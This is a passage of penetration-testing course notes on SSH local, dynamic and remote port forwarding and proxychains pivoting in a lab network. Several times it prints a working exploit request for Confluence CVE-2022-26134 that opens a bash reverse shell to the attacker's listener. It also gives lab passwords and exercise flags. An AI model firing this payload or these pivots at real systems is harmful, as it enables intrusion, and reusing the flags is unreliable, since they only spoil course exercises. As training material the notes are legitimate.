4: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:bf:75:66 brd ff:ff:ff:ff:ff:ff
    inet 10.4.249.215/24 brd 10.4.249.255 scope global ens192
       valid_lft forever preferred_lft forever
5: ens224: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:bf:b3:3c brd ff:ff:ff:ff:ff:ff
    inet 172.16.249.254/24 brd 172.16.249.255 scope global ens224
       valid_lft forever preferred_lft forever
```
- The run `ip route` to see what subnets are in the routing table.
```bash
database_admin@pgdatabase01:~$ ip route
ip route
default via 10.4.249.254 dev ens192 proto static 
10.4.249.0/24 dev ens192 proto kernel scope link src 10.4.249.215 
172.16.249.0/24 dev ens224 proto kernel scope link src 172.16.249.254
```
- We find PGDATABASE01 is attached to another subnet.
	- `172.16.249.0/24`
- We don't find a port scanner, but some initial recon can be done with available tools.
 - Write a bash for loop to sweep hosts for an open for 445 on the /24 subnet.
  - Use Netcat to make our conn `nc`
  - Pass flag `-z` to check for listening port without sending data.
  - Flag `-v` for verbose.
  - Flag `-w` set to `1` for a lower time-out threshold.
```bash
database_admin@pgdatabase01:~$ for i in $(seq 1 254); do nc -zv -w 1 172.16.249.$i 445; done
<(seq 1 254); do nc -zv -w 1 172.16.249.$i 445; done
nc: connect to 172.16.249.1 port 445 (tcp) timed out: Operation now in progress
...
nc: connect to 172.16.249.216 port 445 (tcp) timed out: Operation now in progress
Connection to 172.16.249.217 445 port [tcp/microsoft-ds] succeeded!
...
nc: connect to 172.16.249.253 port 445 (tcp) timed out: Operation now in progress
nc: connect to 172.16.249.254 port 445 (tcp) failed: Connection refused
```
- Most of the conn timeout.
 - Suggesting nothing is there.
- We notice that.
 - PGDATABASE `172.16.249.215` actively refused the conn.
 - We also find a host with TCP port 445 open `172.16.249.217`

We want to enum the MB service on this host.  If we find anything, we want to download it to our Kali machine for inspection.  There are at least two ways to do this.
- We could use the tools we find on PGDATABASE01.
 - Then transfer back to CONFLUENCE01, then back to Kali.
  - But this would be tedious.
- Alternatively we could use SSH local port forwarding.
 - We could create an SSH conn from CONFLUENCE01 to PGDATABASE01.
  - Part of that conn created as a SSH local port forward.
   - Listening on port 4455 on the WAN iface of CONFLUENCE01.
   - Forwarding packets through the SSH tunnel out of PGDATABASE01 directly to the SMB share we found.
   - We then conn to the listening port on CONFLUENCE01 directly from Kali.
*In this scenario, there still is no firewall preventing us from accessing ports that we bind on the WAN interface of CONFLUENCE01. In later sections, we will put the firewall up, and use more advanced techniques to traverse this boundary.*

For now, we kill our existing SSH conn to PGDATABASE01.  We will then setup a new conn with new args to establish the SSH local port forward.
- Local port forward can be setup with OpenSSH `-L`
 - Takes two sockets in `IPADDRESS:PORT` sep with `:` as an arg.
  - E.g. `IPADDRESS:PORT:IPADDRESS:PORT`
 - The first socket is hte listening socket that will be bound to the SSH client machine.
 - The second socket is where we want to forward packets to.
- The rest of the command is as usual.

In this case we want SSH to listen on all ifaces on port 4455 on CONFLUENCE01 `0.0.0.0:4455`, then forward all packets through the SSH tunnel to port 445 on the new host `172.16.249.217:445`.
*We're listening on port 4455 on CONFLUENCE01 because we're running as the confluence user: we don't have the permissions to listen on any port below 1024.*
- Create the conn from CONFLUENCE01 to PGDATABASE01 using SSH.
 - Log in as `database_admin` with `sqlpass123`
 - Pass the local port forwarding args `-L`
 - Use `-N` to prevent a shell from being opened.
```bash
┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
└─$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.45.182] from (UNKNOWN) [192.168.249.63] 37144
bash: cannot set terminal process group (2201): Inappropriate ioctl for device
bash: no job control in this shell
bash: /root/.bashrc: Permission denied
confluence@confluence01:/opt/atlassian/confluence/bin$ python3 -c 'import pty; pty.spawn("/bin/sh")'
</bin$ python3 -c 'import pty; pty.spawn("/bin/sh")'   
$ ssh -N -L 0.0.0.0:4455:172.16.249.217:445 database_admin@10.4.249.215
ssh -N -L 0.0.0.0:4455:172.16.249.217:445 database_admin@10.4.249.215
Could not create directory '/home/confluence/.ssh'.
The authenticity of host '10.4.249.215 (10.4.249.215)' can't be established.
ECDSA key fingerprint is SHA256:GMUxFQSTWYtQRwUc9UvG2+8toeDPtRv3sjPyMfmrOH4.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
yes
Failed to add the host to the list of known hosts (/home/confluence/.ssh/known_hosts).
database_admin@10.4.249.215's password: sqlpass123
```
- After entering password we receive no output.
 - Running SSH with `-N` flag this is normal.
  - We only receive output related to our local port forward.
*If the SSH connection or the port forwarding fails for some reason, and the output we get from the standard SSH session isn't sufficient to troubleshoot it, we can pass the -v flag to ssh in order to receive debug output.*
- Since the rev shell from CONFLUENCE01 is now running the SSH session we must catch another shell.
 - We can then confirm the SSH proc we started is listening on 4455 using `ss -ntplu`
```bash
confluence@confluence01:/opt/atlassian/confluence/bin$ ss -ntplu
ss -ntplu
Netid  State   Recv-Q  Send-Q         Local Address:Port     Peer Address:Port  Process                                                                         
udp    UNCONN  0       0              127.0.0.53%lo:53            0.0.0.0:*                                                                                     
tcp    LISTEN  0       128                  0.0.0.0:22            0.0.0.0:*                                                                                     
tcp    LISTEN  0       128                  0.0.0.0:4455          0.0.0.0:*      users:(("ssh",pid=4297,fd=4))                                                  
tcp    LISTEN  0       4096           127.0.0.53%lo:53            0.0.0.0:*                                                                                     
tcp    LISTEN  0       128                     [::]:22               [::]:*                                                                                     
tcp    LISTEN  0       10                         *:8090                *:*      users:(("java",pid=2250,fd=44))                                                
tcp    LISTEN  0       1024                       *:8091                *:*      users:(("java",pid=2457,fd=21))                                                
tcp    LISTEN  0       1         [::ffff:127.0.0.1]:8000                *:*      users:(("java",pid=2250,fd=76)) 
```
- Now connecting to port 4455 on CONFLUENCE01 is just like a direct conn to port 445 on `172.16.249.217`
 - We can now interact with port 4455 on CONFLUENCE01 from our Kali machine.
- List available shares with `smbclient` option `-L`
 - Pass `4455` to option `-p`
 - Username `hr_admin` to the `-U` option.
 - The password we cracked to the `--password` option.
		- `Welcome1234`
```bash
┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
└─$ smbclient -p 4455 -L //192.168.249.63/ -U hr_admin --password=Welcome1234

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	Scripts         Disk      
	Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.249.63 failed (Error NT_STATUS_CONNECTION_REFUSED)
Unable to connect with SMB1 -- no workgroup available
```
- We find a share called `scripts` we will likely be able to access.
```bash
┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
└─$ smbclient -p 4455 //192.168.249.63/scripts -U hr_admin --password=Welcome1234
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Sep 13 01:37:59 2022
  ..                                 DR        0  Tue Sep  6 08:02:37 2022
  Provisioning.ps1                   AR       50  Tue Sep 13 03:41:53 2022

		5319935 blocks of size 4096. 337733 blocks available
smb: \> get Provisioning.ps1
getting file \Provisioning.ps1 of size 50 as Provisioning.ps1 (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
```
- We can now inspect this file from our Kali machine.

###### Exercises

Start VM Group 1 and follow the steps in this exercise. What's the flag in Provisioning.ps1?
```bash
┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
└─$ cat Provisioning.ps1 
��<# 
This script will create the flag_admin user and set the flag as the password.
WARNING: Do not run this in production using system account.
Last update: September 12, 2022
Last Updated By: Alice Admin
Duration: Unknown
Output: User created
#>

#Requires -RunAsAdministrator

$Flag="OS{cc207083450329c654cee31709f72343}";

$SecurePassword = $Flag | ConvertTo-SecureString -AsPlainText -Force

try {
    Write-Output "Searching for $Username in LocalUser DataBase"
    $UserAccount = Get-LocalUser $Username
    Write-Warning "$Username already exists, just going to reset password."
    $UserAccount | Set-LocalUser -Password $SecurePassword
} catch [Microsoft.PowerShell.Commands.UserNotFoundException] {
    Write-Output "$Username not found, creating the whole user."
    New-LocalUser $Username -Password $SecurePassword -FullName "FLAG USER" -Description "Flag User"
}
```

Start VM Group 2. A server is running on HRSHARES port 4242. Download the ssh_local_client binary from http://CONFLUENCE01:8090/exercises/ssh_local_client. Create an SSH local port forward on CONFLUENCE01, which will let you run the ssh_local_client from your Kali machine against the server on HRSHARES and retrieve the flag.
```
# Kali Netcat listener to CONFLUENCE01 shell

┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
└─$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.45.182] from (UNKNOWN) [192.168.249.63] 34664
bash: cannot set terminal process group (2421): Inappropriate ioctl for device
bash: no job control in this shell
bash: /root/.bashrc: Permission denied
confluence@confluence01:/opt/atlassian/confluence/bin$ python3 -c 'import pty; pty.spawn("/bin/sh")'
</bin$ python3 -c 'import pty; pty.spawn("/bin/sh")'   
$ ssh -V
ssh -V
OpenSSH_8.2p1 Ubuntu-4ubuntu0.5, OpenSSL 1.1.1f  31 Mar 2020
$ ssh -N -L 0.0.0.0:4242:172.16.249.217:4242 database_admin@10.4.249.215
ssh -N -L 0.0.0.0:4242:172.16.249.217:4242 database_admin@10.4.249.215
Could not create directory '/home/confluence/.ssh'.
The authenticity of host '10.4.249.215 (10.4.249.215)' can't be established.
ECDSA key fingerprint is SHA256:GMUxFQSTWYtQRwUc9UvG2+8toeDPtRv3sjPyMfmrOH4.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
yes
Failed to add the host to the list of known hosts (/home/confluence/.ssh/known_hosts).
database_admin@10.4.249.215's password: sqlpass123


# From Kali
┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
└─$ curl http://192.168.249.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.182/4444%200%3E%261%27%29.start%28%29%22%29%7D/
                                                                                         
┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
└─$ sudo nmap -sS -sV -p 4242 192.168.249.63
[sudo] password for operator: 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-08 06:54 PST
Nmap scan report for 192.168.249.63
Host is up (0.075s latency).

PORT     STATE SERVICE         VERSION
4242/tcp open  vrml-multi-use?

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.18 seconds
                                                                                         
┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
└─$ wget http://192.168.249.63/exercises/ssh_local_client -O ssh_local_client   
--2023-11-08 06:55:35--  http://192.168.249.63/exercises/ssh_local_client
Connecting to 192.168.249.63:80... failed: Connection refused.
                                                                                         
┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
└─$ wget http://192.168.249.63:8090/exercises/ssh_local_client -O ssh_local_client
--2023-11-08 06:55:49--  http://192.168.249.63:8090/exercises/ssh_local_client
Connecting to 192.168.249.63:8090... connected.
HTTP request sent, awaiting response... 200 
Length: 1026416 (1002K)
Saving to: ‘ssh_local_client’

ssh_local_client       100%[=========================>]   1002K  1.54MB/s    in 0.6s    

2023-11-08 06:55:50 (1.54 MB/s) - ‘ssh_local_client’ saved [1026416/1026416]

                                                                                         
┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
└─$ ls                               
hashes.txt  modrc  Provisioning.ps1  ssh_local_client
                                                                                         
┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
└─$ file ssh_local_client 
ssh_local_client: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=5769f14f0eae52cb1a6e2688b0ee37b8579f5d48, for GNU/Linux 3.2.0, stripped
                                                                                         
┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
└─$ ./ssh_local_client -h
zsh: permission denied: ./ssh_local_client
                                                                                         
┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
└─$ ls -lha ssh_local_client 
-rw-r--r-- 1 operator operator 1003K Sep 13  2022 ssh_local_client
                                                                                         
┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
└─$ chmod +x ssh_local_client 
                                                                                         
┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
└─$ ls -lha ssh_local_client 
-rwxr-xr-x 1 operator operator 1003K Sep 13  2022 ssh_local_client
                                                                                         
┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
└─$ ./ssh_local_client -h    
prat_server 0.1.0

USAGE:
    ssh_local_client [OPTIONS]

OPTIONS:
    -h, --help                 Print help information
    -i, --ip-addr <IP_ADDR>    [default: 127.0.0.1]
    -p, --port <PORT>          [default: 4141]
    -V, --version              Print version information
                                                                                         
┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
└─$ wget http://192.168.249.63:8090/exercises/client_source.zip -O client_source.zip
--2023-11-08 06:57:07--  http://192.168.249.63:8090/exercises/client_source.zip
Connecting to 192.168.249.63:8090... connected.
HTTP request sent, awaiting response... 200 
Length: 1409 (1.4K) [application/zip]
Saving to: ‘client_source.zip’

client_source.zip      100%[=========================>]   1.38K  --.-KB/s    in 0s      

2023-11-08 06:57:08 (105 MB/s) - ‘client_source.zip’ saved [1409/1409]

                                                                                         
┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
└─$ unzip client_source.zip 
Archive:  client_source.zip
  inflating: client.rs               
  inflating: shared.rs               
                                                                                         
┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
└─$ ls                      
client.rs          hashes.txt  Provisioning.ps1  ssh_local_client
client_source.zip  modrc       shared.rs
                                                                                         
┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
└─$ less client.rs                   
                                                                                         
┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
└─$ ./ssh_local_client -h                                                           
prat_server 0.1.0

USAGE:
    ssh_local_client [OPTIONS]

OPTIONS:
    -h, --help                 Print help information
    -i, --ip-addr <IP_ADDR>    [default: 127.0.0.1]
    -p, --port <PORT>          [default: 4141]
    -V, --version              Print version information
                                                                                         
┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
└─$ ./ssh_local_client -i 192.168.249.63 -p 4242
Connecting to 192.168.249.63:4242
Flag: "OS{ff660661a455b10fcf7f78965a684956}"
```


##### SSH Dynamic Port Forwarding

With local port forwarding we can only conn to one socket per SSH conn, a major limitation.  This becomes tedious at scale.  OpenSSH provides a [dynamic port forwarding](https://man.openbsd.org/ssh#D) allowing a single listener port on the SSH client to forward packets to any socket the server host has access to.

The listening port created by the SSH client is a SOCKS proxy server port.  The SOCKS server accepts packets with a SOCKS proto header and forwards them on to the addressed hosts.

This allows us to send packets to a single port of the SSH client, pushing them through the SSH conn, and forwarding to anywhere the SSH server system can route to.  Only requiring packets to be formatted properly, typically with SOCK-client software.  Some software may not be SOCKS-compatible by default, we will work through this.

As an example let's extend the prior scenario, instead of just conn to the SMB port on HRSHARES, we want to do a full portscan of HRSHARES.

We ensure a TTY shell with Python3 as we did previously, creating the SSH conn from CONFLUENCE01 to PGDATABASE01 with user `database_admin`  and pass `sqlpass123`.
- With OpenSSH.
 - Use `-D` to create the dynamic port forward.
  - The only arg is the port we want to bind, all ifaces on `9999`
 - We also pass the `-N` flag preventing a shell from spawning.
```
# Kali
┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
└─$ curl http://192.168.249.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.182/4444%200%3E%261%27%29.start%28%29%22%29%7D/

# Kali Netcat listener to CONFLUENCE01
┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
└─$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.45.182] from (UNKNOWN) [192.168.249.63] 42070
bash: cannot set terminal process group (2206): Inappropriate ioctl for device
bash: no job control in this shell
bash: /root/.bashrc: Permission denied
confluence@confluence01:/opt/atlassian/confluence/bin$ python3 -c 'import pty; pty.spawn("/bin/sh")'  
</bin$ python3 -c 'import pty; pty.spawn("/bin/sh")'   
$ id
id
uid=1001(confluence) gid=1001(confluence) groups=1001(confluence)

$ ssh -N -D 0.0.0.0:9999 database_admin@10.4.249.215
ssh -N -D 0.0.0.0:9999 database_admin@10.4.249.215
Could not create directory '/home/confluence/.ssh'.
The authenticity of host '10.4.249.215 (10.4.249.215)' can't be established.
ECDSA key fingerprint is SHA256:GMUxFQSTWYtQRwUc9UvG2+8toeDPtRv3sjPyMfmrOH4.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
yes
Failed to add the host to the list of known hosts (/home/confluence/.ssh/known_hosts).
database_admin@10.4.249.215's password: sqlpass123
```
*As before, if we wanted to manually confirm that port 9999 is listening on CONFLUENCE01, we would exploit the Confluence vulnerability again to get another reverse shell (since our existing shell is tied up with the SSH port forward command), then run ss in that shell.*

As we did earlier, we will conn to port 445 on HRSHARES, but this time through the SOCKS proxy port created by our SSH dynamic port forward command.

We will want to use `smbclient` again, but it doesn't have a native option to use a SOCKS proxy.  In these situations we will use [ProxyChains](https://github.com/rofl0r/proxychains-ng).  ProxyChains is a tool that can force network traffic over HTTP or SOCKS proxies, it can also push traffic through a *chain* of concurrent proxies as the name suggests.

*The way Proxychains works is a light hack. It uses the Linux shared object preloading technique (LD_PRELOAD) to hook libc networking functions within the binary that gets passed to it, and forces all connections over the configured proxy server. This means it might not work for everything, but will work for most dynamically-linked binaries that perform simple network operations. It won't work on statically-linked binaries.*

ProxyChains uses a config file for almost everything, located by default at `/etc/proxychains4.conf`.  We edit this file to ensure that proxychains can locate the SOCKS proxy.  Proxies are at the end of the file, we can replace any existing proxy definition with a single line defining proxy type, IP address, and port of the SOCKS proxy on CONFLUENCE01.
```
socks5 192.168.249.63 9999
```
*Although we specify socks5 in this example, it could also be socks4, since SSH supports both. SOCKS5 supports authentication, IPv6, and User Datagram Protocol (UDP), including DNS. Some SOCKS proxies will only support the SOCKS4 protocol. Make sure you check which version is supported by the SOCKS server when using SOCKS proxies in engagements.*

After edit our conf will look like:
```bash
┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
└─$ tail /etc/proxychains.conf 
#         * raw: The traffic is simply forwarded to the proxy without modification.
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
#socks4 	127.0.0.1 9050

socks5 192.168.249.63 9999
```

We can now use ProxyChains to list the available shares on HRSHARES using smbclient on our Kali machine.  Instead of conn to a port of CONFLUENCE01 we will write our command as if smbclient is conn directly to PGDATABASE01.  We simply prepend `proxychains` to the command, reading the conf, and forcing traffic through our SOCKS proxy.
```bash
┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
└─$ proxychains smbclient -L //172.16.249.217/ -U hr_admin --password=Welcome1234
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] Strict chain  ...  192.168.249.63:9999  ...  172.16.249.217:445  ...  OK

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	Scripts         Disk      
	Users           Disk      
Reconnecting with SMB1 for workgroup listing.
[proxychains] Strict chain  ...  192.168.249.63:9999  ...  172.16.249.217:139  ...  OK
[proxychains] Strict chain  ...  192.168.249.63:9999  ...  172.16.249.217:139  ...  OK
do_connect: Connection to 172.16.249.217 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

The conn succeeded and we managed to list shares on HRSHARES, including the interesting `scripts` folder.  We see some addt output from proxychains including the ports interacted with while the proc was running.

We can escalate and port scan HRSHARES through our proxy using Nnamp.
- Use TCP-connect scan `-sT`
- Skip DNS resolution `-n`
- Skiip host discovery `-Pn`
- Check top 20 ports `--top-ports=20`
- Increase verbosity `-vvv`
We once again prepend with `proxychains`
```bash
kali@kali:~$ proxychains nmap -vvv -sT --top-ports=20 -Pn 172.16.50.217
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-20 17:26 EDT
Initiating Parallel DNS resolution of 1 host. at 17:26
Completed Parallel DNS resolution of 1 host. at 17:26, 0.09s elapsed
DNS resolution of 1 IPs took 0.10s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 17:26
Scanning 172.16.50.217 [20 ports]
[proxychains] Strict chain  ...  192.168.50.63:9999  ...  172.16.50.217:111 <--socket error or timeout!
[proxychains] Strict chain  ...  192.168.50.63:9999  ...  172.16.50.217:22 <--socket error or timeout!
...
[proxychains] Strict chain  ...  192.168.50.63:9999  ...  172.16.50.217:5900 <--socket error or timeout!
Completed Connect Scan at 17:30, 244.33s elapsed (20 total ports)
Nmap scan report for 172.16.50.217
Host is up, received user-set (9.0s latency).
Scanned at 2022-08-20 17:26:47 EDT for 244s

PORT     STATE  SERVICE       REASON
21/tcp   closed ftp           conn-refused
22/tcp   closed ssh           conn-refused
23/tcp   closed telnet        conn-refused
25/tcp   closed smtp          conn-refused
53/tcp   closed domain        conn-refused
80/tcp   closed http          conn-refused
110/tcp  closed pop3          conn-refused
111/tcp  closed rpcbind       conn-refused
135/tcp  open   msrpc         syn-ack
139/tcp  open   netbios-ssn   syn-ack
143/tcp  closed imap          conn-refused
443/tcp  closed https         conn-refused
445/tcp  open   microsoft-ds  syn-ack
993/tcp  closed imaps         conn-refused
995/tcp  closed pop3s         conn-refused
1723/tcp closed pptp          conn-refused
3306/tcp closed mysql         conn-refused
3389/tcp open   ms-wbt-server syn-ack
5900/tcp closed vnc           conn-refused
8080/tcp closed http-proxy    conn-refused

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 244.62 seconds
```
The scan succeeds, proxychains gives us insight into each socket attempted, if the conn failed, and how.  Nmap found TCP ports 135, 139, 445, and 3389 are open.

**Speed up port scanning with ProxyChains**
*By default, Proxychains is configured with very high time-out values. This can make port scanning really slow. Lowering the tcp_read_time_out and tcp_connect_time_out values in the Proxychains configuration file will force Proxychains to time-out on non-responsive connections more quickly. This can dramatically speed up port-scanning times.*

We have successfully create a dynamic port forward and used proxychains to push traffic from both smbclient and Nmap through SOCKS proxy port that we created, allowing us to list shares and port scan HRSHARES.

###### Exercises

Follow this walkthrough, and scan HRSHARES from the Kali machine using Nmap and Proxychains. What port between 4800 and 4900 is open?
```bash
┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
└─$ proxychains nmap -vvv -sT -p 4800-4900 -Pn 172.16.249.217

4872/tcp open   unknown        syn-ack
```

Download the client binary ssh_dynamic_client from http://CONFLUENCE01:8090/exercises/ssh_dynamic_client. Using Proxychains, run it against the port you just found.
```bash
┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
└─$ wget http://192.168.249.63:8090/exercises/ssh_dynamic_client -O dyn-port/ssh_dynamic_client
--2023-11-08 08:26:28--  http://192.168.249.63:8090/exercises/ssh_dynamic_client
Connecting to 192.168.249.63:8090... connected.
HTTP request sent, awaiting response... 200 
Length: 1026416 (1002K)
Saving to: ‘dyn-port/ssh_dynamic_client’

dyn-port/ssh_dynamic_c 100%[=========================>]   1002K  1.79MB/s    in 0.5s    

2023-11-08 08:26:29 (1.79 MB/s) - ‘dyn-port/ssh_dynamic_client’ saved [1026416/1026416]

                                                                                         
┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
└─$ wget http://192.168.249.63:8090/exercises/client_source.zip -O dyn-port/client_source.zip
--2023-11-08 08:26:59--  http://192.168.249.63:8090/exercises/client_source.zip
Connecting to 192.168.249.63:8090... connected.
HTTP request sent, awaiting response... 200 
Length: 1409 (1.4K) [application/zip]
Saving to: ‘dyn-port/client_source.zip’

dyn-port/client_source 100%[=========================>]   1.38K  --.-KB/s    in 0s      

2023-11-08 08:27:00 (119 MB/s) - ‘dyn-port/client_source.zip’ saved [1409/1409]

                                                                                         
┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
└─$ cd dyn-port       
                                                                                         
┌──(operator㉿labhost)-[~/OffSec/redir-tunneling/dyn-port]
└─$ ls
client_source.zip  ssh_dynamic_client
                                                                                         
┌──(operator㉿labhost)-[~/OffSec/redir-tunneling/dyn-port]
└─$ unzip client_source.zip
Archive:  client_source.zip
  inflating: client.rs               
  inflating: shared.rs               
                                                                                         
┌──(operator㉿labhost)-[~/OffSec/redir-tunneling/dyn-port]
└─$ less client.rs 
                                                                                         
┌──(operator㉿labhost)-[~/OffSec/redir-tunneling/dyn-port]
└─$ proxychains /home/operator/OffSec/redir-tunneling/dyn-port/ssh_dynamic_client -i 172.16.249.217 -p 4872 
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
proxychains: can't load process '/home/operator/OffSec/redir-tunneling/dyn-port/ssh_dynamic_client'. (hint: it's probably a typo): Permission denied
                                                                                         
┌──(operator㉿labhost)-[~/OffSec/redir-tunneling/dyn-port]
└─$ chmod +x ssh_local_client
chmod: cannot access 'ssh_local_client': No such file or directory
                                                                                         
┌──(operator㉿labhost)-[~/OffSec/redir-tunneling/dyn-port]
└─$ ls            
client.rs  client_source.zip  shared.rs  ssh_dynamic_client
                                                                                         
┌──(operator㉿labhost)-[~/OffSec/redir-tunneling/dyn-port]
└─$ chmod +x ssh_dynamic_client
                                                                                         
┌──(operator㉿labhost)-[~/OffSec/redir-tunneling/dyn-port]
└─$ proxychains /home/operator/OffSec/redir-tunneling/dyn-port/ssh_dynamic_client -i 172.16.249.217 -p 4872
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
Connecting to 172.16.249.217:4872
[proxychains] Strict chain  ...  192.168.249.63:9999  ...  172.16.249.217:4872  ...  OK
Flag: "OS{9bd23e4dda0833dda9cfa3285d4109ec}"
```


##### SSH Remote Port Forwarding

Thus far we've been able to conn to any port we bind on CONFLUENCE01 WAN iface.  IRL, more often than not, hardware/software firewalls will get in the way.  Inbound traffic is typically under tighter control than outbound traffic.  Only in rare cases do we compromise creds of SSH users, allowing us a direct connection into a network and port forwarding.  We will only be able to bind to a network perimeter in rare cases.

More often than not, we will be able to SSH out of a network.  Outbound conns are more difficult to control than inbound conns.  Most corporate networks will allow many types of network traffic out, including SSH, for reasons of simplicity, usability, and business need.  So while it won't be likely to connect to a port we bind to the network perimeter, it will often be possible to SSH out.

This makes SSH [remote port forwarding](https://man.openbsd.org/ssh#R) very useful.  In the same way an attacker can exec a rev shell payload to conn back to a listener they control, SSH remote port forwarding can be used to conn back to a SSH server they control, binding to a port there.  Similar to a reverse shell, for port forwarding.

In local and dynamic port forwarding, the listener port is bound to the server, in remote port forwarding, the listening port is bound to the client.  Packets are forwarded by the client.

Let's reconsider our lab scenario.  We compromise CONFLUENCE01 using CVE-2022-26134.  In this scenario the admin has improved network security by implementing a firewall at the perimeter.  The firewall is configured so, regardless of what port we bind on the WAN iface, the only port we can connect to from our machine is TCP port 8090.

As we did with Socat, we want to enum the PostgreSQL DB running on port 5432 on PGDATABASE01.  CONFLUENCE01 doesn't have the tools we need and because of the firewall we can't create a port forward with a listening port on CONFLUENCE01.

CONFLUENCE01 does have an SSH client and we can setup an SSH serve on our Kali machine.  We can conn from CONFLUENCE01 to our Kali machine over SSH.  The listening TCP port 2345 is bound to the lo iface on our Kali machine.  Packets send to this port are pushed by the Kali SSH server software through the SSH tunnel back to the SSH client on CONFLUENCE01.  They then get forwarded to the PostgresSQL DB port on PGDATABASE01.

To set this up in our lab, we first need to enable the SSH server on our Kali machine.
*Before you start the Kali SSH server, make sure you've set a strong, unique password for the Kali user!*
```bash
┌──(operator㉿labhost)-[~/…/IR/DevOps/logging/cloudfront]
└─$ sudo systemctl start ssh                   
[sudo] password for operator:
```

We can check that the port is open using `ss`.
```bash
┌──(operator㉿labhost)-[~/…/IR/DevOps/logging/cloudfront]
└─$ sudo ss -ntplu          
Netid    State     Recv-Q    Send-Q       Local Address:Port        Peer Address:Port    Process                                                                                  
udp      UNCONN    0         0                  0.0.0.0:35145            0.0.0.0:*        users:(("openvpn",pid=533211,fd=3))                                                     
udp      UNCONN    0         0              224.0.0.251:5353             0.0.0.0:*        users:(("chrome",pid=4017,fd=237))                                                      
udp      UNCONN    0         0              224.0.0.251:5353             0.0.0.0:*        users:(("chrome",pid=4017,fd=184))                                                      
udp      UNCONN    0         0              224.0.0.251:5353             0.0.0.0:*        users:(("chrome",pid=4064,fd=81))                                                       
tcp      LISTEN    0         128                0.0.0.0:22               0.0.0.0:*        users:(("sshd",pid=1578,fd=3))                                                          
tcp      LISTEN    0         1                127.0.0.1:38184            0.0.0.0:*        users:(("autossh",pid=531863,fd=3))                                                     
tcp      LISTEN    0         511              127.0.0.1:6463             0.0.0.0:*        users:(("Discord",pid=152499,fd=179))                                                   
